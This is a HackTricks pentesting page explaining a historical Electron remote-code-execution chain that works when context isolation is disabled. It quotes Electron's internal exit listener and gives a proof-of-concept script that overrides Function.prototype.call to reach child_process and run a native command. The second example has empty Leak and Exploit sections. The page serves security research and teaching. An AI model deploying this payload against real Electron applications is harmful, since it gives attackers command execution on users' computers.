---
title: "Electron contextIsolation RCE via Electron internal code"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/network-services-pentesting/pentesting-web/electron-desktop-apps/electron-contextisolation-rce-via-electron-internal-code.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: network
---

# Electron context-isolation RCE via internal code

## Example 1: overriding `Function.prototype.call`

`Function.prototype.call`
This example comes from Masato Kinugawa’s CureCon presentation.[\[2\]](#references)

In the affected historical Electron build, internal ASAR code registered a process `exit` listener. Because page code and Electron’s internal code shared JavaScript prototypes when context isolation was disabled, renderer code could replace `Function.prototype.call` before the internal listener ran.[\[2\]](#references)[\[3\]](#references)

```
process.on("exit", function () {
  for (let p in cachedArchives) {
    if (!hasProp.call(cachedArchives, p)) continue
    cachedArchives[p].destroy()
  }
})
```
The listener was dispatched through Node.js’s event machinery. The original page linked a stale `bin/events.js` path; the same historical commit’s live source is under `lib/events.js`.[\[5\]](#references)

In this path, `self` is Node.js’s process object:

The historical process object exposed a path to `require`:

```
process.mainModule.require
```
Because the listener dispatcher invoked the handler with the process object, overriding `call` could recover that object and execute a native command:

```
<script>
  Function.prototype.call = function (process) {
    process.mainModule.require("child_process").execSync("calc")
  }
  location.reload() // Trigger the listener during navigation
</script>
```
## Example 2: prototype pollution

The ElectroVolt presentation demonstrates another historical chain that obtains a `require` object through prototype pollution.[\[4\]](#references)

Leak:

Exploit:

## References
